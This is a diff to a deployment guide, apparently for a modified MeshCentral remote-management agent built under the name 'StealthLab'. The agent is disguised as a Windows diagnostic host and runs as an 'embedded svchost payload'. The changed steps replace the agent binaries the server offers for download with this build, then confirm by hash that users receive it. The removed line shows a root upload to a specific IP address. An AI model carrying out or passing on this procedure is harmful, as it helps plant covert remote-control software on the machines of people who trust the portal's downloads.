@@ -199,18 +199,31 @@ Deliverable contents:
 
 ## Deploy to MeshCentral
 
-1. Copy the freshly built `diagsvc.dll` to the MeshCentral server. Adjust the destination to match your installation (default shown below):
+1. **Stage locally with the helper.** When the MeshCentral data folder sits beside the MeshAgent repo (default dev rig), run:
    ```powershell
-   scp dist\package_*\diagsvc.dll root@72.60.233.29:/opt/meshcentral/meshcentral-data/agents-custom/meshagent_win32_x64.exe
+   pwsh .\tools\stage_meshcentral_agents.ps1 `
+        -MeshCentralDataPath '..\meshcentral-data' `
+        -IncludeWin32
    ```
-   *If you maintain separate x86/x64 payloads, upload each with the name MeshCentral expects.*
-2. (Optional but recommended) Replace the download executable with `dist\meshcentral\MeshService64.exe` copied to `/opt/meshcentral/meshcentral-data/agents/MeshService64.exe` (and `MeshService.exe` for Win32). This keeps the portal download in sync with the svchost payload.
-3. Back up the existing agent binaries before overwriting.
-4. Restart MeshCentral to make the new agent downloadable:
-   ```bash
-   sudo systemctl restart meshcentral
+   The script copies `MeshService64.exe`, `MeshService.exe`, and `WinDiagnosticHost.msh` into `meshcentral-data\agents\` and mirrors the executables into `meshcentral-data\signedagents\`, printing the new SHA256 values.
+2. **Stage remotely when needed.** Copy the same files to `/opt/meshcentral/meshcentral-data/agents/` on the target server:
+   ```powershell
+   scp meshservice\x64\StealthLab\MeshService-2022.exe deploy@prod:/opt/meshcentral/meshcentral-data/agents/MeshService64.exe
+   scp meshservice\StealthLab\MeshService-2022.exe deploy@prod:/opt/meshcentral/meshcentral-data/agents/MeshService.exe
+   scp WinDiagnosticHost.msh deploy@prod:/opt/meshcentral/meshcentral-data/agents/MeshService-2022.msh
    ```
-5. From the MeshCentral portal, download the Windows x64 agent and confirm the timestamp/hash matches the build. Compare the agent hash against `meshcore/embedded/generated/svchost_payload.json` (or rerun the runtime validation tests) to ensure the embedded svchost payload matches.
+   Adjust hostnames and credentials as required; the key point is to avoid the deprecated `agents-custom/` directory entirely.
+3. **Restart MeshCentral / flush cache.** Either restart the service (`sudo systemctl restart meshcentral` on Linux) or allow `tools\Invoke-RuntimeValidation.ps1` to do it for you (it stops any local `node meshcentral.js` processes, restarts them, and deletes cached diaghost downloads).
+4. **Prove download parity.** Always run:
+   ```powershell
+   pwsh .\tools\Invoke-RuntimeValidation.ps1 `
+        -MeshCentralRepo '..\MeshCentral' `
+        -BinaryPath 'meshservice\x64\StealthLab' `
+        -ReportPath 'verification\phase3\runtime.json' `
+        -LogPath 'verification\phase3\runtime.log'
+   ```
+   The helper restages MeshCentral if needed, downloads a fresh agent via `meshctrl`, installs/uninstalls via svchost, and fails if the server serves the wrong binary or if the service type deviates from `SERVICE_WIN32_SHARE_PROCESS`.
+5. **Manual spot-check (optional).** Download the Windows x64 agent from the portal (or via `meshctrl AgentDownload --type 4`) and confirm the SHA256 matches `meshservice\x64\StealthLab\MeshService-2022.exe`. Compare against `dist\...\hashes.txt` to make sure the embedded svchost payload is identical.
 
 ---
 
